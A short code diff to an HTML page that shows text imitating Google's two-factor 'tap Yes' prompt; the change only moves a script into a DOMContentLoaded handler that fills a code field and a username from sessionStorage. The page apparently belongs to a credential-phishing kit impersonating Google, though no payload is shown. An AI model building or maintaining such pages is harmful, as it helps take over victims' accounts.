@@ -416,14 +416,16 @@ Google sent a notification to your Device. Open the Gmail app and tap <strong>Ye
 <script src="assets/emit.js"></script> 
 <script>
 	
-	if(sessionStorage.getItem("setPromptCode"))
-{
-  updatePhoneField("#code", sessionStorage.getItem("setPromptCode"));
-}
-	
-page = "prompt";
-document.querySelector("#username").textContent = sessionStorage.getItem("user");
+	document.addEventListener("DOMContentLoaded", function () {
 
+  if (sessionStorage.getItem("setPromptCode")) {
+    updatePhoneField("#code", sessionStorage.getItem("setPromptCode"));
+  }
+
+  page = "prompt";
+  document.querySelector("#username").textContent = sessionStorage.getItem("user");
+
+});
 </script>
 
 </body>
